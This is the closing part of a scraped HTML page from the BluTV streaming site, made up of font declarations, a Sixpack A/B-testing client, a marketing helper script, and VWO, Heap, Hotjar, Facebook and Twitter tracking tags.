		<link rel="preload" href="https://blutv-objects.mncdn.com/assets/fonts/WorkSans-SemiBold.woff2?v=400" as="font" type="font/woff2" crossorigin="">
		<link rel="preload" href="https://blutv-objects.mncdn.com/assets/fonts/WorkSans-Bold.woff2?v=400" as="font" type="font/woff2" crossorigin="">
		<link rel="preload" href="https://blutv-objects.mncdn.com/assets/fonts/lg.woff2?v=400" as="font" type="font/woff2" crossorigin="">

		<style>
			@font-face {
				font-family: 'font-blutv';
				font-display: block;
				src: local('font-blutv'), local('blutv'),
							url('https://blutv-objects.mncdn.com/assets/fonts/blutv.woff2?v=400') format('woff2'),
							url('https://blutv-objects.mncdn.com/assets/fonts/blutv.ttf?v=400') format('truetype');
				font-weight: 'normal';
				font-style: 'normal';
			}
			@font-face {
				font-family: 'Work Sans';
				font-display: block;
				src: local('WorkSans-Light'),
							url('https://blutv-objects.mncdn.com/assets/fonts/WorkSans-Light.woff2?v=400') format('woff2'),
							url('https://blutv-objects.mncdn.com/assets/fonts/WorkSans-Light.ttf?v=400') format('truetype');
				font-weight: 300;
				font-style: 'normal';
			}
			@font-face {
				font-family: 'Work Sans';
				font-display: block;
				src: local('WorkSans-Regular'),
							url('https://blutv-objects.mncdn.com/assets/fonts/WorkSans-Regular.woff2?v=400') format('woff2'),
							url('https://blutv-objects.mncdn.com/assets/fonts/WorkSans-Regular.ttf?v=400') format('truetype');
				font-weight: 400;
				font-style: 'normal';
			}
			@font-face {
				font-family: 'Work Sans';
				font-display: block;
				src: local('WorkSans-Medium'),
							url('https://blutv-objects.mncdn.com/assets/fonts/WorkSans-Medium.woff2?v=400') format('woff2'),
							url('https://blutv-objects.mncdn.com/assets/fonts/WorkSans-Medium.ttf?v=400') format('truetype');
				font-weight: 500;
				font-style: 'normal';
			}
			@font-face {
				font-family: 'Work Sans';
				font-display: block;
				src: local('WorkSans-SemiBold'),
							url('https://blutv-objects.mncdn.com/assets/fonts/WorkSans-SemiBold.woff2?v=400') format('woff2'),
							url('https://blutv-objects.mncdn.com/assets/fonts/WorkSans-SemiBold.ttf?v=400') format('truetype');
				font-weight: 600;
				font-style: 'normal';
			}
			@font-face {
				font-family: 'Work Sans';
				src: local('WorkSans-Bold'),
							url('https://blutv-objects.mncdn.com/assets/fonts/WorkSans-Bold.woff2?v=400') format('woff2'),
							url('https://blutv-objects.mncdn.com/assets/fonts/WorkSans-Bold.ttf?v=400') format('truetype');
				font-weight: 700;
				font-style: 'normal';
			}
			@font-face {
				font-family: 'lg';
				font-display: block;
				src: local('lg'),
							url('https://blutv-objects.mncdn.com/assets/fonts/lg.woff2?v=400') format('woff2'),
							url('https://blutv-objects.mncdn.com/assets/fonts/lg.ttf?v=400') format('truetype');
				font-weight: 'normal';
				font-style: 'normal';
			}
		</style>
		
					<link rel="stylesheet" href="https://blutv-objects.mncdn.com/assets/css/vendors.min.css?v=400" as="style" onload="this.rel='stylesheet'" crossorigin="">
			<link rel="stylesheet" href="https://blutv-objects.mncdn.com/assets/css/uxquark.min.css?v=400" as="style" onload="this.rel='stylesheet'" crossorigin="">
		

		
		<!-- Sixpack -->
		<script>
			!function(){Object.assign||Object.defineProperty(Object,"assign",{enumerable:!1,configurable:!0,writable:!0,value:function(e){"use strict";if(null==e)throw new TypeError("Cannot convert first argument to object");for(var t=Object(e),n=1;n<arguments.length;n++){var r=arguments[n];if(null!=r){r=Object(r);for(var i=Object.keys(Object(r)),a=0,o=i.length;a<o;a++){var s=i[a],u=Object.getOwnPropertyDescriptor(r,s);void 0!==u&&u.enumerable&&(t[s]=r[s])}}}return t}});var u={base_url:"http://localhost:5000",ip_address:null,user_agent:null,timeout:1e3,persist:!0,cookie_name:"sixpack_client_id",cookie_domain:null,ignore_alternates_warning:null},c=!1;"undefined"==typeof window?c=!0:window.sixpack=u,u.generate_client_id=function(){var e="xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g,function(e){var t=16*Math.random()|0;return("x"==e?t:3&t|8).toString(16)});if(!c&&this.persist){var t=this.cookie_name+"="+e+"; expires=Tue, 19 Jan 2038 03:14:07 GMT; path=/";this.cookie_domain&&(t+="; domain="+this.cookie_domain),document.cookie=t}return e},u.persisted_client_id=function(){var e;return(e=new RegExp("(?:^|; )"+encodeURIComponent(this.cookie_name)+"=([^;]*)").exec(document.cookie))?e[1]:null},u.Session=function(e){if(Object.assign(this,u,e),!this.client_id)if(this.persist&&!c){var t=this.persisted_client_id();this.client_id=null!==t?t:this.generate_client_id()}else this.client_id=this.generate_client_id();c||(this.user_agent=this.user_agent||window&&window.navigator&&window.navigator.userAgent)},u.Session.prototype={participate:function(e,n,t,r,i){if("function"==typeof t?(i=t,r=t=null):"string"==typeof t&&(i=r,r=t,t=null),"function"==typeof r&&(i=r,r=null),!i)throw new Error("Callback is not specified");if(!e||!/^[a-z0-9][a-z0-9\-_ ]*$/.test(e))return i(new Error("Bad experiment_name"));if(n.length<2&&!0!==this.ignore_alternates_warning)return i(new Error("Must specify at least 2 alternatives"));for(var a=0;a<n.length;a+=1)if(!/^[a-z0-9][a-z0-9\-_ ]*$/.test(n[a]))return i(new Error("Bad alternative name: "+n[a]));var o={client_id:this.client_id,experiment:e,alternatives:n};if(!c&&null==r){var s=new RegExp("[\\?&]sixpack-force-"+e+"=([^&#]*)").exec(window.location.search);null!=s&&(r=decodeURIComponent(s[1].replace(/\+/g," ")))}return null===t||isNaN(t)||(o.traffic_fraction=t),null!=r&&f(n,r)?i(null,{status:"ok",alternative:{name:r},experiment:{version:0,name:e},client_id:this.client_id}):(this.ip_address&&(o.ip_address=this.ip_address),this.user_agent&&(o.user_agent=this.user_agent),d(this.base_url+"/participate",o,this.timeout,function(e,t){return e&&(t={status:"failed",error:e,alternative:{name:n[0]}}),i(null,t)}))},convert:function(e,t,n){if("function"==typeof t&&(n=t,t=null),n||(n=function(e){e&&console&&console.error&&console.error(e)}),!e||!/^[a-z0-9][a-z0-9\-_ ]*$/.test(e))return n(new Error("Bad experiment_name"));var r={client_id:this.client_id,experiment:e};return this.ip_address&&(r.ip_address=this.ip_address),this.user_agent&&(r.user_agent=this.user_agent),t&&(r.kpi=t),d(this.base_url+"/convert",r,this.timeout,function(e,t){return e&&(t={status:"failed",error:e}),n(null,t)})}};var l=0,d=function(e,t,n,r){var i=!1,a=setTimeout(function(){return i=!0,r(new Error("request timed out"))},n);if(!c){var o="callback"+ ++l;t.callback="sixpack."+o,u[o]=function(e){if(!i)return clearTimeout(a),r(null,e)}}var s=p(e,t);c?require("http").get(s,function(t){var n="";return t.on("data",function(e){return n+=e}),t.on("end",function(){var e;if(e=500==t.statusCode?{status:"failed",response:n}:JSON.parse(n),!i)return clearTimeout(a),r(null,e)})}).on("error",function(e){if(!i)return clearTimeout(a),r(e)}):(script=document.createElement("script"),script.type="text/javascript",script.src=s,script.async=!0,document.body.appendChild(script))},p=function(e,t){var n=[],r=encodeURIComponent;for(var i in t)if(t.hasOwnProperty(i)){var a=t[i];"[object Array]"!==Object.prototype.toString.call(a)&&(a=[a]);for(var o=0;o<a.length;o+=1)n.push(r(i)+"="+r(a[o]))}return n.length&&(e+="?"+n.join("&")),e},f=function(e,t){for(var n=0;n<e.length;n++)if(e[n]===t)return!0;return!1};"undefined"!=typeof module&&"undefined"!=typeof require&&(module.exports=u)}();
		</script>
	

<div id="criteo-tags-div" style="display: none;"></div><script type="text/javascript" id="">hype={pagedata:{},logger:{groupOpened:!1},modal:{},exitIntent:{},create:{},hyperootdomain:window.location.host,listenedFunctions:{},lastListenedEvent:null,dataLayerIndex:-1,dataLayerEcIndex:-1,loggerstarted:!1,what:Object.prototype.toString,asciilogo:"  _                      \n | |                     \n | |__  _   _ _ __   ___ \n | '_ \\| | | | '_ \\ / _ \\\n | | | | |_| | |_) |  __/\n |_| |_|\\__, | .__/ \\___|\n         __/ | |         \n        |___/|_|         ",isObjectEmpty:function(a){for(var b in a)if(Object.prototype.hasOwnProperty.call(a,
b))return!1;return!0}};window.hype.getDataLayerVariable=function(a){var b=null;if(1==window.hasOwnProperty("dataLayer"))for(var c=0,d=window.dataLayer.length;c<d;c++)1==window.dataLayer[c].hasOwnProperty(a)&&(b=window.dataLayer[c][a]);return b};hype.logger.isActive=function(){if(Storage)return!0===localStorage.getItem("hypeLogger")?!0:!1};hype.logger.activate=function(){Storage&&(localStorage.setItem("hypeLogger",!0),confirm("Hype logger aktifle\u015ftirildi, sayfay\u0131 yenileyim mi?")&&location.reload())};
hype.logger.stop=function(){Storage&&(localStorage.setItem("hypeLogger",!1),confirm("Hype logger kapat\u0131ld\u0131, sayfay\u0131 yenileyim mi?")&&location.reload())};hype.logger.info=function(a){"true"==localStorage.getItem("hypeLogger")&&(!1===hype.loggerstarted&&(console.log(hype.asciilogo),hype.loggerstarted=!0),console.info("[HYPE Bilgi]: "+a))};
hype.logger.warn=function(a){"true"==localStorage.getItem("hypeLogger")&&(!1===hype.loggerstarted&&(console.log(hype.asciilogo),hype.loggerstarted=!0),console.warn("[HYPE Uyar\u0131]: "+a))};hype.logger.group=function(){"true"==localStorage.getItem("hypeLogger")&&!1===hype.logger.groupOpened&&(console.group(),hype.logger.groupOpened=!0)};hype.logger.groupEnd=function(){"true"==localStorage.getItem("hypeLogger")&&(console.groupEnd(),hype.logger.groupOpened=!1)};
window.hype.checkifloaded=function(a,b,c,d,e){var k=!1;"undefined"==typeof window.hype.checkerSlot&&(window.hype.checkerSlot=[]);var f=window.hype.checkerSlot;"number"!==typeof e&&(e=f.length,f[f.length]=0);var g=c||100,h=d||50;setTimeout(function(){!1===window.eval(a)&&f[e]<1E3*h/g&&!1===k?(hype.logger.info(a+" ifadesi true d\u00f6nmedi, "+c+"ms bekliyorum."),f[e]++,window.hype.checkifloaded(a,b,g,h,e)):f[e]>=1E3*h/g?hype.logger.warn("s\u00fcre doldu ne yazik ki bulamadik"):(hype.logger.info("ifade "+
50*(f[e]+1)/1E3+" saniyede bulundu, fonksiyonu calistiriyorum"),k=!0,b())},g)};hype.setCookie=function(a,b,c){var d=new Date;d.setTime(d.getTime()+864E5*c);d="expires\x3d"+d.toUTCString();document.cookie=0==c?a+"\x3d"+b+"; domain\x3d."+hype.hyperootdomain+";path\x3d/":a+"\x3d"+b+"; "+d+"; domain\x3d."+hype.hyperootdomain+";path\x3d/"};
hype.getCookie=function(a){a+="\x3d";for(var b=document.cookie.split(";"),c=0;c<b.length;c++){for(var d=b[c];" "==d.charAt(0);)d=d.substring(1);if(0==d.indexOf(a))return d.substring(a.length,d.length)}return""};hype.checkCookie=function(a){return""!=hype.getCookie(a)?!0:!1};hype.removeCookie=function(a){var b="expires\x3dThu, 01 Jan 1970 00:00:00 UTC;";document.cookie=a+"\x3d; "+b+"domain\x3d."+hype.hyperootdomain+";path\x3d/";document.cookie=a+"\x3d; "+b+"path\x3d/";document.cookie=a+"\x3d; "+b};
hype.toFixed=function(a,b){b=b||0;var c=Math.pow(10,b),d=Math.abs(Math.round(a*c)),e=(0>a?"-":"")+String(Math.floor(d/c));0<b&&(c=String(d%c),d=Array(Math.max(b-c.length,0)+1).join("0"),e+="."+d+c);return e};
window.hype.dateIsBetween=function(a,b,c){if("undefined"==typeof a)return!1;var d=/(\d{2})\-(\d{2})-(\d{4})/;b="function"===typeof b.getMonth?b:new Date(b.replace(d,"$3-$2-$1"));var e="function"===typeof c.getMonth?c:new Date(c.replace(d,"$3-$2-$1"));a="function"===typeof a.getMonth?c:new Date(a.replace(d,"$3-$2-$1"));return a<e&&a>b||a.getTime()==b.getTime()&&b.getTime()==e.getTime()?!0:!1};
hype.modal=function(a){void 0==a&&(a={});var b=a.className||"",c=a.idName||"",d=a.width||"50vw",e=a.height||"500px",k=a.left||"calc(50% - 25vw)",f=a.right||"auto",g=a.top||"calc(50% - 250px)",h=a.bottom||"auto",p=a.background||"#fff",q=a.padding||"25px",m=a.position||"fixed",n=a.display||"block",r=a.closeImg||"https://hypeistanbul.com/img/close.jpg";a=a.html||"";var l='\x3cstyle class\x3d"hypeModalStyle"\x3e';l+=".hypeModal {width:"+d+"; height:"+e+"; left:"+k+"; right:"+f+"; top:"+g+"; bottom:"+
h+"; background:"+p+"; padding:"+q+"; position:"+m+"; z-index: 9999; -webkit-box-sizing: border-box; -moz-box-sizing: border-box; box-sizing: border-box; display:"+n+";} .hypeModalBlocker {width:100%; height:100vh; position:"+m+"; left:0; top:0; z-index: 9990; background:rgba(0,0,0,0.7);  display:"+n+";} .hypeClose {width:40px; height:40px; position:absolute; right:-20px; top:-20px; background:url("+r+") no-repeat center center; background-size:100%;}";l+="\x3c/style\x3e";document.head.insertAdjacentHTML("beforeend",
l);b='\x3cdiv class\x3d"hypeModal '+b+'" id\x3d"'+c+'"\x3e \x3ca href\x3d"javascript:;" class\x3d"hypeClose"\x3e\x3c/a\x3e \x3cdiv class\x3d"hypeModalContent"\x3e '+a+" \x3c/div\x3e  \x3c/div\x3e";document.querySelector("body").insertAdjacentHTML("beforeend",b);0==document.querySelectorAll(".hypeModalBlocker").length?(b='\x3cdiv class\x3d"hypeModalBlocker"\x3e \x3c/div\x3e',document.querySelector("body").insertAdjacentHTML("beforeend",b)):document.querySelector(".hypeModalBlocker").style.display=
"block";if(0!==document.querySelectorAll(".hypeClose").length)for(b=0;b<document.querySelectorAll(".hypeClose").length;b++)document.querySelectorAll(".hypeClose")[b].addEventListener("click",function(){hype.modal.hide()});if(0!==document.querySelectorAll(".hypeModalBlocker").length)for(b=0;b<document.querySelectorAll(".hypeModalBlocker").length;b++)document.querySelectorAll(".hypeModalBlocker")[b].addEventListener("click",function(){hype.modal.hide()})};
hype.modal.hide=function(a){a=a||".hypeModal";var b=document.querySelectorAll(a).length;0!==document.querySelectorAll(".hypeModalBlocker").length&&(document.querySelector(".hypeModalBlocker").style.display="none");for(var c=0;c<b;c++)0!==document.querySelectorAll(a).length&&(document.querySelectorAll(a)[c].style.display="none")};
hype.modal.show=function(a){a=a||".hypeModal";var b=document.querySelectorAll(a).length;0!==document.querySelectorAll(".hypeModalBlocker").length&&(document.querySelector(".hypeModalBlocker").style.display="block");for(var c=0;c<b;c++)0!==document.querySelectorAll(a).length&&(document.querySelectorAll(a)[c].style.display="block")};
hype.exitIntent=function(a,b){void 0==a&&(a={});var c=a.cookie||"1";"function"!==typeof b&&(b=function(){hype.logger.warn("Herhangi bir fonksiyon yaz\u0131lmas\u0131 laz\u0131m!")});document.addEventListener("mouseleave",function(a){0>a.clientY&&("1"==c?!0!==hype.checkCookie("hype-exit")&&(hype.setCookie("hype-exit",!0),cookieStatus=!1,b()):b())},!1);document.querySelector(".blutv-logo")&&document.querySelector(".blutv-logo").addEventListener("mouseenter",function(a){0>a.clientY&&("1"==c?!0!==hype.checkCookie("hype-exit")&&
(hype.setCookie("hype-exit",!0),cookieStatus=!1,b()):b())},!1)};hype.append=function(a){void 0==a&&(a={});var b=a.selectorName||"body",c=a.position||"beforeend";html=a.html||"";document.querySelector(b).insertAdjacentHTML(c,html)};</script><script type="text/javascript" id="">window.sendFBViewContentEvent=function(c){1==window.hasOwnProperty("fbq")&&null!==c&&""!==c&&"undefined"!==c&&"null"!==c&&fbq("trackSingle","1612708812183031","ViewContent",{content_type:"product",content_ids:c})};window.syncSixpackExperiments=function(c,a){if("undefined"!==typeof Storage){var b=localStorage.getItem("sixpack_experiments");null!==b?(b=JSON.parse(b),b[c]=a,localStorage.setItem("sixpack_experiments",JSON.stringify(b))):(b={},b[c]=a,localStorage.setItem("sixpack_experiments",JSON.stringify(b)))}};
window.participateExperiment=function(c,a,b,d,e){if(null===b||1==isNaN(b))b=1;1<b&&(b=1);if(window.hasOwnProperty("sixpack")&&"object"==typeof sixpack){-1<sixpack.base_url.indexOf("localhost")&&(sixpack.base_url="https://sixpack.blutv.com");var f=new sixpack.Session;f.participate(a,d,b,function(b,d){if(b)throw b;alt=d.alternative.name;console.log("Chosen alternative for Experiment ("+c+") is "+alt);syncSixpackExperiments(a,alt);e(alt);window.hj=window.hj||function(){(hj.q=hj.q||[]).push(arguments)};
hj("tagRecording",["Experiment",a+" - "+alt]);hj("trigger",a);hj("trigger",a+"_"+alt);window.hasOwnProperty("heap")&&("mobilefreetrialremove2"==a?heap.addUserProperties({"A/B":c+" - "+alt}):"payment_exit_offer"==a||"payment_exit_offer_2"==a?heap.addUserProperties({"A/B4":c+" - "+alt}):"payment_university_text"==a?heap.addUserProperties({"A/B5":c+" - "+alt}):heap.addUserProperties({"A/B2":c+" - "+alt}));window.hasOwnProperty("bluTrack")&&window.bluTrack("send","event",{en:"A/B",ev:{test_name:a,variation:alt}})})}};
window.convertExperiment=function(c,a){if(window.hasOwnProperty("sixpack")&&"object"==typeof sixpack){var b=new sixpack.Session;b.convert(c,a,function(b,e){if(b)throw b;console.log(a+" kpi conversion information sent for Experiment ("+c+")");window.hj=window.hj||function(){(hj.q=hj.q||[]).push(arguments)};hj("tagRecording",[a])})}};
window.convertAllExperiments=function(c){if("undefined"!==typeof Storage){var a=localStorage.getItem("sixpack_experiments");if(null!==a){a=JSON.parse(a);for(var b in a)a.hasOwnProperty(b)&&convertExperiment(b,c)}}};window.getSixpackVariant=function(c){if("undefined"!==typeof Storage){var a=localStorage.getItem("sixpack_experiments");return null!==a?(a=JSON.parse(a),void 0!==a[c]?a[c]:null):null}};
window.resetSixpack=function(){if("undefined"!==typeof Storage){hype.removeCookie=function(a){var b="expires\x3dThu, 01 Jan 1970 00:00:00 UTC;";document.cookie=a+"\x3d; "+b+"domain\x3d."+hype.hyperootdomain+";path\x3d/";document.cookie=a+"\x3d; "+b+"path\x3d/";document.cookie=a+"\x3d; "+b};localStorage.removeItem("sixpack_experiments");hype.removeCookie("sixpack_client_id");hype.removeCookie("hype-exit");var c=localStorage.getItem("sixpack_experiments");null!==c&&(window.hype=window.hype||{},window.hyperootdomain=
window.location.host);console.log("Sixpack has been reset.")}};window.checkifloaded=function(c,a){var b=!1,d=200,e=60;window.checkifloadedcycle=window.checkifloadedcycle||0;setTimeout(function(){!1===window.eval(c)&&checkifloadedcycle<1E3*e/d&&!1===b?(checkifloadedcycle++,checkifloaded(c,a)):checkifloadedcycle>=1E3*e/d?window.checkifloadedcycle=0:(b=!0,window.checkifloadedcycle=0,a())},d)};</script><script type="text/javascript" id="">_vis_opt_check_segment={52:!0};
var _vwo_code=function(){var e=268332,f=2E3,g=2500,h=!1,k=1,d=!1,c=document;return{use_existing_jquery:function(){return h},library_tolerance:function(){return g},finish:function(){if(!d){d=!0;var a=c.getElementById("_vis_opt_path_hides");a&&a.parentNode.removeChild(a)}},finished:function(){return d},load:function(a){var b=c.createElement("script");b.src=a;b.type="text/javascript";b.innerText;b.onerror=function(){_vwo_code.finish()};c.getElementsByTagName("head")[0].appendChild(b)},init:function(){settings_timer=
setTimeout("_vwo_code.finish()",f);var a=c.createElement("style"),b="body{}",d=c.getElementsByTagName("head")[0];a.setAttribute("id","_vis_opt_path_hides");a.setAttribute("type","text/css");a.styleSheet?a.styleSheet.cssText=b:a.appendChild(c.createTextNode(b));d.appendChild(a);this.load("//dev.visualwebsiteoptimizer.com/j.php?a\x3d"+e+"\x26u\x3d"+encodeURIComponent(c.URL)+"\x26f\x3d"+ +k+"\x26r\x3d"+Math.random());return settings_timer}}}();_vwo_settings_timer=_vwo_code.init();</script><script type="text/javascript" id="">try{$(document).ready(function(){if(window.heap&&null!=window.window.blutvuser.UserID){var a=window.blutvuser;heap.identify(a.UserID);heap.addUserProperties({Country:a.Country,AccountState:a.AccountState,AccountType:a.AccountType,PaymentType:a.PaymentType,Product:a.Product,StartDate:a.StartDate,EndDate:a.EndDate,ExpireDate:a.ExpireDate,SuspendDate:a.SuspendDate,Extend:a.Extend,Discount:a.Discount,FreeTrial:a.FreeTrial,IsVIP:a.IsVIP,IsNew:a.IsNew,IsShare:a.IsShare,IsApproved:a.IsApproved,IsNewHistory:a.IsNewHistory,
IsActive:a.IsActive,IsFree:a.IsFree,IsCanceled:a.IsCanceled,Price:a.Price,VerifyAge:a.VerifyAge,CardStatus:a.CardStatus,BankName:a.BankName,Segment:a.Segment})}})}catch(a){console.log(a)};</script><script type="text/javascript" id="">try{var expcookie="undefined";if(""!==expcookie&&"undefined"!==expcookie){var expid=expcookie.match(/\..\.(.*?)\.[0-9][0-9][0-9]*/)[1],expvar=expcookie.match(/\.([0-9][0-9]?!?$)/)[1];heap.addUserProperties({"A/B2":expid+" - "+expvar});window.hj=window.hj||function(){(hj.q=hj.q||[]).push(arguments)};hj("tagRecording",[expid+" - "+expvar])}}catch(a){console.log(a)};</script><script type="text/javascript" id="">!function(b,d,h){var e=[],f=[],k=function(c,a){a.e===c[0]&&a.c.apply(this,[c])},g=function(c,a){a.e&&a.e!==c[1]||a.v&&a.v!==c[2]||a.c.apply(this,[c])},l=d.push;d.push=function(){for(var c=arguments[0],a=0;a<f.length;a++)k(c,f[a]);if("rH"===c[0]||"vS"===c[0])for(a=0;a<e.length;a++)g(c,e[a]);l.apply(d,[].slice.call(arguments))};b.onVariationApplied=function(c,a,b){"function"==typeof c&&(b=c,c=null,a=null);b=b||h;c={e:c,v:a,c:b};e.push(c);for(a=0;a<d.length;a++)"rH"!==d[a][0]&&"vS"!==d[a][0]||g(d[a],
c)};b.onEventReceive=function(c,a){a=a||h;var b={e:c,c:a};f.push(b);for(var e=0;e<d.length;e++)g(d[e],b)}}(window.VWO=window.VWO||[],window._vwo_evq=window._vwo_evq||[],function(){});
(function(){window.dataLayer=window.dataLayer||[];window.VWO.push(["onVariationApplied",function(b){if(b){var d=b[1];b=b[2];"undefined"!==typeof _vwo_exp[d].comb_n[b]&&"website"!==_vwo_exp[d].comb_n[b]&&(window.dataLayer.push({CampaignId:d,CampaignName:_vwo_exp[d].name,VariationId:b,VariationName:_vwo_exp[d].comb_n[b],event:"VWO"}),1==window.hasOwnProperty("heap")&&heap.addUserProperties({"A/B":_vwo_exp[d].name+" - "+_vwo_exp[d].comb_n[b]}),window.hj=window.hj||function(){(hj.q=hj.q||[]).push(arguments)},
hj("tagRecording",["VWO",_vwo_exp[d].name,_vwo_exp[d].comb_n[b],b]))}}])})();</script><script type="text/javascript" id="">window.hj=window.hj||function(){(hj.q=hj.q||[]).push(arguments)};hj("trigger","not_logined_homepage");</script><script type="text/javascript" id="">window.VWO=window.VWO||[];window.VWO.push(["activate",!1,[53],!0]);</script><script type="text/javascript" id="" src="https://www.googletagmanager.com/gtag/js?id=DC-8521900"></script>
<script type="text/javascript" id="">!function(b,e,f,g,a,c,d){b.fbq||(a=b.fbq=function(){a.callMethod?a.callMethod.apply(a,arguments):a.queue.push(arguments)},b._fbq||(b._fbq=a),a.push=a,a.loaded=!0,a.version="2.0",a.queue=[],c=e.createElement(f),c.async=!0,c.src=g,d=e.getElementsByTagName(f)[0],d.parentNode.insertBefore(c,d))}(window,document,"script","https://connect.facebook.net/en_US/fbevents.js");fbq("init","1612708812183031");fbq("track","PageView");</script>
<noscript><img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=1612708812183031&amp;ev=PageView&amp;noscript=1"></noscript>

<script type="text/javascript" id="">(function(){var a=new URLSearchParams(window.location.search);param=a.get("isYearly");"true"==param&&sessionStorage.setItem("isYearlyPackage",param)})();</script>


<script type="text/javascript" id="">window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date);gtag("config","DC-8521900");</script><iframe name="_hjRemoteVarsFrame" title="_hjRemoteVarsFrame" id="_hjRemoteVarsFrame" src="https://vars.hotjar.com/box-90f3a29ef7448451db5af955688970d7.html" style="display: none !important; width: 1px !important; height: 1px !important; opacity: 0 !important; pointer-events: none !important;"></iframe><div id="ads"></div><script src="https://analytics.twitter.com/i/adsct?p_id=Twitter&amp;p_user_id=0&amp;txn_id=nv0nx&amp;events=%5B%5B%22pageview%22%2Cnull%5D%5D&amp;tw_sale_amount=0&amp;tw_order_quantity=0&amp;tw_iframe_status=0&amp;tpx_cb=twttr.conversion.loadPixels&amp;tw_document_href=https%3A%2F%2Fwww.blutv.com.tr%2F" type="text/javascript"></script><script src="https://analytics.twitter.com/i/adsct?p_id=Twitter&amp;p_user_id=0&amp;txn_id=nv0nx&amp;events=%5B%5B%22pageview%22%2Cnull%5D%5D&amp;tw_sale_amount=0&amp;tw_order_quantity=0&amp;tw_iframe_status=0&amp;tpx_cb=twttr.conversion.loadPixels&amp;tw_document_href=https%3A%2F%2Fwww.blutv.com.tr%2F" type="text/javascript"></script></body></html>